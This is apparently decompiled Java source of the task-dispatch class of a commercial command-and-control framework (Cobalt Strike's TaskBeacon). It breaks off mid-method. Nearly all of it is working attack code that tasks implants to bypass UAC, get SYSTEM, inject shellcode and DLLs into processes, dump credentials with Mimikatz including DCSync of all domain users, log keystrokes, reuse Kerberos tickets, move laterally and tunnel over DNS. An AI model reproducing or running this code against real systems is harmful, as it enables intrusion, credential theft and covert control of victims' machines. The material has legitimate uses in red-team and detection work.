package beacon;

import aggressor.AggressorClient;
import aggressor.DataManager;
import aggressor.DataUtils;
import aggressor.GlobalDataManager;
import beacon.inline.BypassUACToken;
import beacon.inline.GetSystem;
import beacon.inline.KerberosTicketPurge;
import beacon.inline.KerberosTicketUse;
import beacon.inline.NetDomain;
import beacon.jobs.BypassUACJob;
import beacon.jobs.DesktopJob;
import beacon.jobs.DllSpawnJob;
import beacon.jobs.ExecuteAssemblyJob;
import beacon.jobs.HashdumpJob;
import beacon.jobs.KeyloggerJob;
import beacon.jobs.MimikatzJob;
import beacon.jobs.MimikatzJobSmall;
import beacon.jobs.NetViewJob;
import beacon.jobs.PortScannerJob;
import beacon.jobs.PowerShellJob;
import beacon.jobs.ScreenshotJob;
import beacon.setup.BrowserPivot;
import common.ArtifactUtils;
import common.AssertUtils;
import common.BeaconEntry;
import common.BeaconOutput;
import common.ByteIterator;
import common.CommonUtils;
import common.ListenerUtils;
import common.MudgeSanity;
import common.PowerShellUtils;
import common.ReflectiveDLL;
import common.ResourceUtils;
import common.ScListener;
import common.Shellcode;
import common.TeamQueue;
import common.VPNClient;
import dialog.DialogUtils;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Stack;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import kerberos.KerberosUtils;
import pe.PEParser;

public class TaskBeacon {
   protected GlobalDataManager gdata;
   protected String[] bids;
   protected TeamQueue conn;
   protected EncodedCommandBuilder builder;
   protected DataManager data;
   protected AggressorClient client;
   protected boolean silent;
   private static Pattern funcp = null;

   public AggressorClient getClient() {
      return this.client;
   }

   public void silent() {
      this.silent = true;
   }

   public boolean disableAMSI() {
      return DataUtils.disableAMSI(this.data);
   }

   public boolean obfuscatePostEx() {
      return DataUtils.obfuscatePostEx(this.data);
   }

   public boolean useSmartInject() {
      return DataUtils.useSmartInject(this.data);
   }

   public String arch(String var1) {
      BeaconEntry var2 = DataUtils.getBeacon(this.data, var1);
      return var2 != null ? var2.arch() : "x86";
   }

   public TaskBeacon(AggressorClient var1, String[] var2) {
      this(var1, var1.getData(), var1.getConnection(), var2);
   }

   public TaskBeacon(AggressorClient var1, DataManager var2, TeamQueue var3, String[] var4) {
      this.gdata = GlobalDataManager.getGlobalDataManager();
      this.builder = null;
      this.silent = false;
      this.client = var1;
      this.bids = var4;
      this.conn = var3;
      this.data = var2;
      this.builder = new EncodedCommandBuilder(var1);
   }

   public void task(byte[] var1, byte[] var2, String var3) {
      this.task(var1, var2, var3, "");
   }

   public String getPsExecService() {
      String var1 = this.client.getScriptEngine().format("PSEXEC_SERVICE", new Stack());
      return var1 != null && !"".equals(var1) ? var1 : CommonUtils.garbage("service");
   }

   public void whitelistPort(String var1, int var2) {
      this.conn.call("beacons.whitelist_port", CommonUtils.args(var1, var2));
   }

   public void task(byte[] var1, byte[] var2, String var3, String var4) {
      for(int var5 = 0; var5 < this.bids.length; ++var5) {
         this.log_task(this.bids[var5], var3, var4);
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var1));
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var2));
      }

   }

   public void log_task(String var1, String var2) {
      this.log_task(var1, var2, "");
   }

   public void log_task(String var1, String var2, String var3) {
      if (!this.silent) {
         this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Task(var1, var2, var3)));
      }
   }

   public void input(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(this.bids[var2], var1)));
      }

   }

   public void log(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Output(this.bids[var2], var1)));
      }

   }

   public void log2(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.OutputB(this.bids[var2], var1)));
      }

   }

   public void error(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.error(this.bids[var2], var1);
      }

   }

   public void error(String var1, String var2) {
      this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(var1, var2)));
   }

   public void task(String var1) {
      this.task(var1, "");
   }

   public void task(String var1, String var2) {
      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.log_task(this.bids[var3], var1, var2);
      }

   }

   public void task(String var1, byte[] var2, String var3) {
      this.task(var1, var2, var3, "");
   }

   public void task(String var1, byte[] var2, byte[] var3, String var4) {
      this.task(var1, var2, var3, var4, "");
   }

   public void task(String var1, byte[] var2, String var3, String var4) {
      this.log_task(var1, var3, var4);
      this.conn.call("beacons.task", CommonUtils.args(var1, var2));
   }

   public void task(String var1, byte[] var2, byte[] var3, String var4, String var5) {
      this.log_task(var1, var4, var5);
      this.conn.call("beacons.task", CommonUtils.args(var1, var2));
      this.conn.call("beacons.task", CommonUtils.args(var1, var3));
   }

   protected void taskNoArgs(int var1, String var2) {
      this.taskNoArgs(var1, var2, "");
   }

   protected void taskNoArgs(int var1, String var2, String var3) {
      this.builder.setCommand(var1);
      byte[] var4 = this.builder.build();

      for(int var5 = 0; var5 < this.bids.length; ++var5) {
         this.log_task(this.bids[var5], var2, var3);
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var4));
      }

   }

   protected void taskNoArgsCallback(int var1, String var2) {
      this.taskNoArgsCallback(var1, var2, "");
   }

   protected void taskNoArgsCallback(int var1, String var2, String var3) {
      this.builder.setCommand(var1);
      this.builder.addInteger(0);
      byte[] var4 = this.builder.build();

      for(int var5 = 0; var5 < this.bids.length; ++var5) {
         this.log_task(this.bids[var5], var2, var3);
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var4));
      }

   }

   protected void taskOneArg(int var1, String var2, String var3) {
      this.taskOneArg(var1, var2, var3, "");
   }

   protected void taskOneArg(int var1, String var2, String var3, String var4) {
      this.builder.setCommand(var1);
      this.builder.addString(var2);
      byte[] var5 = this.builder.build();

      for(int var6 = 0; var6 < this.bids.length; ++var6) {
         this.log_task(this.bids[var6], var3, var4);
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var6], var5));
      }

   }

   protected void taskOneEncodedArg(int var1, String var2, String var3, String var4) {
      for(int var5 = 0; var5 < this.bids.length; ++var5) {
         this.builder.setCommand(var1);
         this.builder.addEncodedString(this.bids[var5], var2);
         byte[] var6 = this.builder.build();
         this.log_task(this.bids[var5], var3, var4);
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var6));
      }

   }

   protected void taskOneArgI(int var1, int var2, String var3) {
      this.taskOneArgI(var1, var2, var3, "");
   }

   protected void taskOneArgI(int var1, int var2, String var3, String var4) {
      this.builder.setCommand(var1);
      this.builder.addInteger(var2);
      byte[] var5 = this.builder.build();

      for(int var6 = 0; var6 < this.bids.length; ++var6) {
         this.log_task(this.bids[var6], var3, var4);
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var6], var5));
      }

   }

   protected void taskOneArgS(int var1, int var2, String var3) {
      this.taskOneArgS(var1, var2, var3, "");
   }

   protected void taskOneArgS(int var1, int var2, String var3, String var4) {
      this.builder.setCommand(var1);
      this.builder.addShort(var2);
      byte[] var5 = this.builder.build();

      for(int var6 = 0; var6 < this.bids.length; ++var6) {
         this.log_task(this.bids[var6], var3, var4);
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var6], var5));
      }

   }

   public String cmd_sanity(String var1, String var2) {
      if (var1.length() > 8191) {
         CommonUtils.print_error(var2 + " command is " + var1.length() + " bytes. This exceeds the 8191 byte command-line string limitation in Windows. This action will fail. Likely, your Resource Kit script is generating a script that is too large. Optimize your templates for size.");
      }

      return var1;
   }

   public void BrowserPivot(int var1, String var2) {
      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.BrowserPivot(this.bids[var3], var1, var2, CommonUtils.randomPort());
      }

   }

   public void BrowserPivot(String var1, int var2, String var3, int var4) {
      int var5 = CommonUtils.randomPort();
      byte[] var6 = (new BrowserPivot(this, var5, var3.equals("x64"))).export();
      if (var3.equals("x64")) {
         this.builder.setCommand(43);
      } else {
         this.builder.setCommand(9);
      }

      this.builder.addInteger(var2);
      this.builder.addInteger(0);
      this.builder.addString(CommonUtils.bString(var6));
      this.builder.pad(var6.length, 1024);
      byte[] var7 = this.builder.build();
      this.log_task(var1, "Injecting browser pivot DLL into " + var2, "T1111, T1055, T1185");
      this.conn.call("beacons.task", CommonUtils.args(var1, var7));
      this.conn.call("browserpivot.start", CommonUtils.args(var1, var4 + "", var5 + ""));
      this.GoInteractive(var1);
      this.conn.call("beacons.portfwd", CommonUtils.args(var1, "127.0.0.1", var5));
   }

   public void BrowserPivotStop() {
      for(int var1 = 0; var1 < this.bids.length; ++var1) {
         this.conn.call("browserpivot.stop", CommonUtils.args(this.bids[var1]));
      }

   }

   public void BypassUAC(String var1) {
      ScListener var2 = ListenerUtils.getListener(this.client, var1);

      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this._BypassUAC(this.bids[var3], var2);
      }

      this.linkToPayloadLocal(var2);
   }

   protected void _BypassUAC(String var1, ScListener var2) {
      int var3 = CommonUtils.randomPort();
      String var4 = CommonUtils.garbage("elev") + ".dll";
      BeaconEntry var5 = DataUtils.getBeacon(this.data, var1);
      if (var5 == null) {
         this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(var1, "Please wait until Beacon checks in next [could not find metadata]")));
      } else {
         byte[] var6 = var2.getPayloadStagerLocal(var3, "x86");
         Object var7 = null;
         byte[] var8;
         if (var5.is64()) {
            if (var5.getVersion() >= 6.2) {
               var8 = (new ArtifactUtils(this.client)).patchArtifact(var6, "artifactuac64alt.dll");
            } else {
               var8 = (new ArtifactUtils(this.client)).patchArtifact(var6, "artifactuac64.dll");
            }
         } else if (var5.getVersion() >= 6.2) {
            var8 = (new ArtifactUtils(this.client)).patchArtifact(var6, "artifactuac32alt.dll");
         } else {
            var8 = (new ArtifactUtils(this.client)).patchArtifact(var6, "artifactuac32.dll");
         }

         if (var8.length >= 24576) {
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(var1, "UAC artifact template (" + var8.length + " bytes) exceeds the 24576 byte max. Make your UAC artifacts smaller.")));
         } else {
            (new BypassUACJob(this, var4, var2.toString(), var8)).spawn(var1, var5.is64() ? "x64" : "x86");
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.FileIndicator(var1, var4, var8)));
            this.StageTCP(var1, "127.0.0.1", var3, "x86", var2);
         }
      }
   }

   public void BypassUACToken(String var1) {
      ScListener var2 = ListenerUtils.getListener(this.client, var1);

      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.BypassUACToken(this.bids[var3], var2);
      }

      this.linkToPayloadLocal(var2);
   }

   public void BypassUACToken(String var1, ScListener var2) {
      String var3 = this.arch(var1);
      byte[] var4 = var2.export(var3);
      this.log_task(var1, "Tasked beacon to spawn " + var2 + " in a high integrity process (token duplication)", "T1088, T1093");
      (new BypassUACToken(this.client, var4)).spawnAndInject(var1);
   }

   public String SetupPayloadDownloadCradle(String var1, ScListener var2) {
      String var3 = this.arch(var1);
      byte[] var4 = var2.export(var3);
      byte[] var5 = (new ResourceUtils(this.client)).buildPowerShell(var4, "x64".equals(var3));
      int var6 = CommonUtils.randomPort();
      String var7 = (new PowerShellUtils(this.client)).format((new PowerShellUtils(this.client)).PowerShellDownloadCradle("http://127.0.0.1:" + var6 + "/"), false);
      this.builder.setCommand(59);
      this.builder.addShort(var6);
      this.builder.addString(var5);
      byte[] var8 = this.builder.build();
      this.conn.call("beacons.task", CommonUtils.args(var1, var8));
      return var7;
   }

   public String SetupPayloadDownloadCradle(String var1, String var2, ScListener var3) {
      byte[] var4 = var3.export(var2);
      byte[] var5 = (new ResourceUtils(this.client)).buildPowerShell(var4, "x64".equals(var2));
      int var6 = CommonUtils.randomPort();
      String var7 = (new PowerShellUtils(this.client)).format((new PowerShellUtils(this.client)).PowerShellDownloadCradle("http://127.0.0.1:" + var6 + "/"), false);
      this.builder.setCommand(59);
      this.builder.addShort(var6);
      this.builder.addString(var5);
      byte[] var8 = this.builder.build();
      this.conn.call("beacons.task", CommonUtils.args(var1, var8));
      return var7;
   }

   public void Checkin() {
      this.taskNoArgs(8, "Tasked beacon to checkin");
   }

   public void Cancel(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.log_task(this.bids[var2], "Tasked " + CommonUtils.session(this.bids[var2]) + " to cancel downloads that match " + var1);
         this.conn.call("beacons.download_cancel", CommonUtils.args(this.bids[var2], var1));
      }

   }

   public void Cd(String var1) {
      this.taskOneEncodedArg(5, var1, "cd " + var1, "");
   }

   public void Clear() {
      for(int var1 = 0; var1 < this.bids.length; ++var1) {
         this.log_task(this.bids[var1], "Cleared " + CommonUtils.session(this.bids[var1]) + " queue");
         this.conn.call("beacons.clear", CommonUtils.args(this.bids[var1]));
      }

   }

   public void Connect(String var1) {
      this.Connect(var1, DataUtils.getProfile(this.client.getData()).getInt(".tcp_port"));
   }

   public void Connect(String var1, int var2) {
      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.log_task(this.bids[var3], "Tasked to connect to " + var1 + ":" + var2, "T1090");
         this.ConnectExplicit(this.bids[var3], var1, var2);
      }

   }

   public void ConnectExplicit(String var1, String var2, int var3) {
      this.builder.setCommand(86);
      this.builder.addShort(var3);
      this.builder.addStringASCIIZ(var2);
      this.conn.call("beacons.task", CommonUtils.args(var1, this.builder.build()));
   }

   public String file_to_tactic(String var1) {
      var1 = var1.toLowerCase();
      return !var1.startsWith("\\\\") || !CommonUtils.isin("\\C$", var1) && !CommonUtils.isin("\\ADMIN$", var1) ? "" : "T1077";
   }

   public void BlockDLLs(boolean var1) {
      if (var1) {
         this.taskOneArgI(92, 1, "Tasked beacon to block non-Microsoft binaries in child processes", "T1106");
      } else {
         this.taskOneArgI(92, 0, "Tasked beacon to not block non-Microsoft binaries in child processes", "T1106");
      }

   }

   public void Copy(String var1, String var2) {
      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.builder.setCommand(73);
         this.builder.addLengthAndEncodedString(this.bids[var3], var1);
         this.builder.addLengthAndEncodedString(this.bids[var3], var2);
         byte[] var4 = this.builder.build();
         this.log_task(this.bids[var3], "Tasked beacon to copy " + var1 + " to " + var2, this.file_to_tactic(var2));
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var4));
      }

   }

   public void CovertVPN(String var1, String var2, String var3, String var4) {
      BeaconEntry var5 = DataUtils.getBeacon(this.data, var1);
      if (var5 != null && var5.getVersion() >= 10.0) {
         this.error("CovertVPN is not compatible with Windows 10");
      } else {
         Map var6 = DataUtils.getInterface(this.data, var2);
         if (var6.size() == 0) {
            this.error("No interface " + var2);
         } else {
            if (var4 != null) {
               this.conn.call("cloudstrike.set_tap_hwaddr", CommonUtils.args(var2, var4));
            }

            String var7 = DataUtils.getLocalIP(this.data);
            HashSet var8 = new HashSet(DataUtils.getBeaconChain(this.data, var1));
            byte[] var9 = VPNClient.exportClient(var7, var3, var6, var8);
            if (var9.length != 0) {
               var9 = ReflectiveDLL.patchDOSHeader(var9);
               if ("TCP (Bind)".equals(var6.get("channel"))) {
                  this.GoInteractive(var1);
                  this.conn.call("beacons.portfwd", CommonUtils.args(var1, "127.0.0.1", var6.get("port")));
               }

               this.taskOneArg(1, CommonUtils.bString(var9), "Tasked beacon to deploy Covert VPN for " + var2, "T1093");
            }
         }
      }
   }

   public void CovertVPN(String var1, String var2) {
      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.CovertVPN(this.bids[var3], var1, var2, (String)null);
      }

   }

   public void DcSync(String var1, String var2) {
      this.MimikatzSmall("@lsadump::dcsync /domain:" + var1 + " /user:" + var2);
   }

   public void DcSync(String var1) {
      this.MimikatzSmall("@lsadump::dcsync /domain:" + var1 + " /all /csv");
   }

   public void Desktop(boolean var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.GoInteractive(this.bids[var2]);
         (new DesktopJob(this)).spawn(this.bids[var2], this.arch(this.bids[var2]), var1);
      }

   }

   public void Desktop(int var1, String var2, boolean var3) {
      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         this.GoInteractive(this.bids[var4]);
         (new DesktopJob(this)).inject(this.bids[var4], var1, var2, var3);
      }

   }

   public void Die() {
      this.builder.setCommand(3);
      byte[] var1 = this.builder.build();

      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.log_task(this.bids[var2], "Tasked " + CommonUtils.session(this.bids[var2]) + " to exit");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var2], var1));
      }

   }

   public void DllInject(int var1, String var2) {
      byte[] var3 = CommonUtils.readFile(var2);
      int var4 = ReflectiveDLL.findReflectiveLoader(var3);
      if (var4 <= 0) {
         this.error("Could not find reflective loader in " + var2);
      } else {
         if (ReflectiveDLL.is64(var3)) {
            this.builder.setCommand(43);
         } else {
            this.builder.setCommand(9);
         }

         this.builder.addInteger(var1);
         this.builder.addInteger(var4);
         this.builder.addString(CommonUtils.bString(var3));
         byte[] var5 = this.builder.build();

         for(int var6 = 0; var6 < this.bids.length; ++var6) {
            this.log_task(this.bids[var6], "Tasked beacon to inject " + var2 + " into " + var1, "T1055");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[var6], var5));
         }

      }
   }

   public void DllLoad(int var1, String var2) {
      this.builder.setCommand(80);
      this.builder.addInteger(var1);
      this.builder.addString(var2 + '\u0000');
      byte[] var3 = this.builder.build();

      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         this.log_task(this.bids[var4], "Tasked beacon to load " + var2 + " into " + var1, "T1055");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var4], var3));
      }

   }

   public void DllSpawn(String var1, String var2, String var3, int var4, boolean var5) {
      DllSpawnJob var6 = new DllSpawnJob(this, var1, var2, var3, var4, var5);

      for(int var7 = 0; var7 < this.bids.length; ++var7) {
         var6.spawn(this.bids[var7]);
      }

   }

   public void Download(String var1) {
      if (this.bids.length > 0) {
         if (var1.startsWith("\\\\")) {
            this.taskOneEncodedArg(11, var1, "Tasked " + CommonUtils.session(this.bids[0]) + " to download " + var1, "T1039");
         } else {
            this.taskOneEncodedArg(11, var1, "Tasked " + CommonUtils.session(this.bids[0]) + " to download " + var1, "T1005");
         }
      }

   }

   public void Drives() {
      for(int var1 = 0; var1 < this.bids.length; ++var1) {
         this.log_task(this.bids[var1], "Tasked beacon to list drives");
         this.conn.call("beacons.task_drives_default", CommonUtils.args(this.bids[var1]));
      }

   }

   public void Elevate(String var1, String var2) {
      BeaconExploits.Exploit var3 = DataUtils.getBeaconExploits(this.data).getExploit(var1);

      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         var3.elevate(this.bids[var4], var2);
      }

   }

   public void ElevateCommand(String var1, String var2) {
      BeaconElevators.Elevator var3 = DataUtils.getBeaconElevators(this.data).getCommandElevator(var1);

      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         var3.runasadmin(this.bids[var4], var2);
      }

   }

   public void Execute(String var1) {
      this.taskOneEncodedArg(12, var1, "Tasked beacon to execute: " + var1, "T1106");
   }

   public void ExecuteAssembly(String var1, String var2) {
      PEParser var3 = PEParser.load(CommonUtils.readFile(var1));
      if (!var3.isProcessAssembly()) {
         this.error("File " + var1 + " is not a process assembly (.NET EXE)");
      } else {
         for(int var4 = 0; var4 < this.bids.length; ++var4) {
            BeaconEntry var5 = DataUtils.getBeacon(this.data, this.bids[var4]);
            if (var5.is64()) {
               (new ExecuteAssemblyJob(this, var1, var2, "x64")).spawn(this.bids[var4]);
            } else {
               (new ExecuteAssemblyJob(this, var1, var2, "x86")).spawn(this.bids[var4]);
            }
         }

      }
   }

   public void GetPrivs() {
      this.GetPrivs("SeDebugPrivilege, SeTcbPrivilege, SeCreateTokenPrivilege, SeAssignPrimaryTokenPrivilege, SeLockMemoryPrivilege, SeIncreaseQuotaPrivilege, SeUnsolicitedInputPrivilege, SeMachineAccountPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeSystemProfilePrivilege, SeSystemtimePrivilege, SeProfileSingleProcessPrivilege, SeIncreaseBasePriorityPrivilege, SeCreatePagefilePrivilege, SeCreatePermanentPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeShutdownPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeChangeNotifyPrivilege, SeRemoteShutdownPrivilege, SeUndockPrivilege, SeSyncAgentPrivilege, SeEnableDelegationPrivilege, SeManageVolumePrivilege");
   }

   public void GetPrivs(String var1) {
      this.builder.setCommand(77);
      this.builder.addStringArray(CommonUtils.toArray(var1));
      byte[] var2 = this.builder.build();

      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.log_task(this.bids[var3], "Tasked beacon to enable privileges", "T1134");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var2));
      }

   }

   public void GetSystem() {
      for(int var1 = 0; var1 < this.bids.length; ++var1) {
         this.GetSystem(this.bids[var1]);
      }

   }

   public void GetSystem(String var1) {
      this.log_task(var1, "Tasked beacon to get SYSTEM", "T1134");
      (new GetSystem(this.client)).go(var1);
   }

   public void GetUID() {
      this.taskNoArgs(27, "Tasked beacon to get userid");
   }

   public void Hashdump() {
      for(int var1 = 0; var1 < this.bids.length; ++var1) {
         BeaconEntry var2 = DataUtils.getBeacon(this.data, this.bids[var1]);
         if (var2.is64()) {
            (new HashdumpJob(this)).spawn(this.bids[var1], "x64");
         } else {
            (new HashdumpJob(this)).spawn(this.bids[var1], "x86");
         }
      }

   }

   public void Inject(int var1, String var2) {
      this.Inject(var1, var2, "x86");
   }

   public void Inject(int var1, String var2, String var3) {
      AssertUtils.TestPID(var1);
      AssertUtils.TestSetValue(var3, "x86, x64");
      ScListener var4 = ListenerUtils.getListener(this.client, var2);
      byte[] var5 = var4.export(var3, 1);
      if (var3.equals("x86")) {
         this.builder.setCommand(9);
      } else if (var3.equals("x64")) {
         this.builder.setCommand(43);
      }

      this.builder.addInteger(var1);
      this.builder.addInteger(0);
      this.builder.addString(CommonUtils.bString(var5));
      byte[] var6 = this.builder.build();

      for(int var7 = 0; var7 < this.bids.length; ++var7) {
         this.log_task(this.bids[var7], "Tasked beacon to inject " + var4 + " into " + var1 + " (" + var3 + ")", "T1055");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var7], var6));
      }

      this.linkToPayloadLocal(var4);
   }

   public void InlineExecute(String var1) {
      String var2 = "";

      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         String var4 = this.arch(this.bids[var3]);
         this.builder.setCommand(95);
         if ("x86".equals(var4)) {
            var2 = "resources/postex.dll";
         } else {
            var2 = "resources/postex.x64.dll";
         }

         byte[] var5 = CommonUtils.readResource(var2);
         PEParser var6 = PEParser.load(var5);
         byte[] var7 = var6.carveExportedFunction(var1);
         CommonUtils.print_info("Carved: " + var7.length + " bytes from " + var2);
         CommonUtils.writeToFile(new File("carved.bin"), var7);
         this.builder.addLengthAndStringASCIIZ("\u0000");
         this.builder.addString(var7);
         this.log_task(this.bids[var3], "Tasked beacon to execute " + var2 + "!" + var1, "");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], this.builder.build()));
      }

   }

   public void JobKill(int var1) {
      this.builder.setCommand(42);
      this.builder.addShort(var1);
      byte[] var2 = this.builder.build();

      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.log_task(this.bids[var3], "Tasked beacon to kill job " + var1);
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var2));
      }

   }

   public void Jobs() {
      this.taskNoArgs(41, "Tasked beacon to list jobs");
   }

   public void Jump(String var1, String var2, String var3) {
      BeaconRemoteExploits.RemoteExploit var4 = DataUtils.getBeaconRemoteExploits(this.data).getRemoteExploit(var1);

      for(int var5 = 0; var5 < this.bids.length; ++var5) {
         var4.jump(this.bids[var5], var2, var3);
      }

   }

   public void KerberosTicketPurge() {
      for(int var1 = 0; var1 < this.bids.length; ++var1) {
         this.log_task(this.bids[var1], "Tasked beacon to purge kerberos tickets", "T1097");
         (new KerberosTicketPurge(this.client)).go(this.bids[var1]);
      }

   }

   public void KerberosTicketUse(String var1) {
      byte[] var2 = CommonUtils.readFile(var1);

      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.log_task(this.bids[var3], "Tasked beacon to apply ticket in " + var1, "T1097");
         (new KerberosTicketUse(this.client, var2)).go(this.bids[var3]);
      }

   }

   public void KerberosCCacheUse(String var1) {
      byte[] var2 = KerberosUtils.ConvertCCacheToKrbCred(var1);
      if (var2.length == 0) {
         this.error("Could not extract ticket from " + var1);
      } else {
         for(int var3 = 0; var3 < this.bids.length; ++var3) {
            this.log_task(this.bids[var3], "Tasked beacon to extract and apply ticket from " + var1, "T1097");
            (new KerberosTicketUse(this.client, var2)).go(this.bids[var3]);
         }
      }

   }

   public void KeyLogger() {
      for(int var1 = 0; var1 < this.bids.length; ++var1) {
         BeaconEntry var2 = DataUtils.getBeacon(this.data, this.bids[var1]);
         if (var2 != null) {
            (new KeyloggerJob(this)).spawn(this.bids[var1], var2.arch());
         }
      }

   }

   public void KeyLogger(int var1, String var2) {
      (new KeyloggerJob(this)).inject(var1, var2);
   }

   public void Kill(int var1) {
      this.taskOneArgI(33, var1, "Tasked beacon to kill " + var1);
   }

   public void Link(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.log_task(this.bids[var2], "Tasked to link to " + var1, "T1090");
         this.LinkExplicit(this.bids[var2], var1);
      }

   }

   public void LinkExplicit(String var1, String var2) {
      this.builder.setCommand(68);
      this.builder.addStringASCIIZ(var2);
      this.conn.call("beacons.task", CommonUtils.args(var1, this.builder.build()));
   }

   public void LoginUser(String var1, String var2, String var3) {
      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         this.builder.setCommand(49);
         this.builder.addLengthAndEncodedString(this.bids[var4], var1);
         this.builder.addLengthAndEncodedString(this.bids[var4], var2);
         this.builder.addLengthAndEncodedString(this.bids[var4], var3);
         byte[] var5 = this.builder.build();
         this.log_task(this.bids[var4], "Tasked beacon to create a token for " + var1 + "\\" + var2, "T1134");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var4], var5));
      }

   }

   public void LogonPasswords() {
      this.MimikatzSmall("sekurlsa::logonpasswords");
   }

   public void Ls(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         if (var1.startsWith("\\\\") && var1.endsWith("$")) {
            this.log_task(this.bids[var2], "Tasked beacon to list files in " + var1, "T1077");
         } else {
            this.log_task(this.bids[var2], "Tasked beacon to list files in " + var1);
         }

         String var3 = CommonUtils.bString(DataUtils.encodeForBeacon(this.data, this.bids[var2], var1));
         this.conn.call("beacons.task_ls_default", CommonUtils.args(this.bids[var2], var3));
      }

   }

   public void Message(String var1) {
   }

   public void Mimikatz(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         BeaconEntry var3 = DataUtils.getBeacon(this.data, this.bids[var2]);
         if (var3.is64()) {
            (new MimikatzJob(this, var1)).spawn(this.bids[var2], "x64");
         } else {
            (new MimikatzJob(this, var1)).spawn(this.bids[var2], "x86");
         }
      }

   }

   public void MimikatzSmall(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         BeaconEntry var3 = DataUtils.getBeacon(this.data, this.bids[var2]);
         if (var3.is64()) {
            (new MimikatzJobSmall(this, var1)).spawn(this.bids[var2], "x64");
         } else {
            (new MimikatzJobSmall(this, var1)).spawn(this.bids[var2], "x86");
         }
      }

   }

   public void MkDir(String var1) {
      this.taskOneEncodedArg(54, var1, "Tasked beacon to make directory " + var1, "");
   }

   protected void mode(String var1, String var2) {
      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Mode(this.bids[var3], var2)));
         this.conn.call("beacons.mode", CommonUtils.args(this.bids[var3], var1));
      }

   }

   public void ModeDNS() {
      this.mode("dns", "data channel set to DNS");
   }

   public void ModeDNS6() {
      this.mode("dns6", "data channel set to DNS6");
   }

   public void ModeDNS_TXT() {
      this.mode("dns-txt", "data channel set to DNS-TXT");
   }

   public void ModeHTTP() {
      this.mode("http", "data channel set to HTTP");
   }

   public void Move(String var1, String var2) {
      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.builder.setCommand(74);
         this.builder.addLengthAndEncodedString(this.bids[var3], var1);
         this.builder.addLengthAndEncodedString(this.bids[var3], var2);
         byte[] var4 = this.builder.build();
         this.log_task(this.bids[var3], "Tasked beacon to move " + var1 + " to " + var2, this.file_to_tactic(var2));
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var4));
      }

   }

   public void NetView(String var1, String var2, String var3) {
      if ("domain".equals(var1)) {
         for(int var4 = 0; var4 < this.bids.length; ++var4) {
            this.log_task(this.bids[var4], "Tasked beacon to run net domain");
            (new NetDomain(this.client)).go(this.bids[var4]);
         }
      } else {
         this._NetView(var1, var2, var3);
      }

   }

   public void _NetView(String var1, String var2, String var3) {
      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         BeaconEntry var5 = DataUtils.getBeacon(this.data, this.bids[var4]);
         if (var5 != null) {
            (new NetViewJob(this, var1, var2, var3)).spawn(this.bids[var4], var5.arch());
         }
      }

   }

   public void Note(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.conn.call("beacons.note", CommonUtils.args(this.bids[var2], var1));
      }

   }

   public void OneLiner(String var1, String var2) {
      ScListener var3 = ListenerUtils.getListener(this.client, var1);

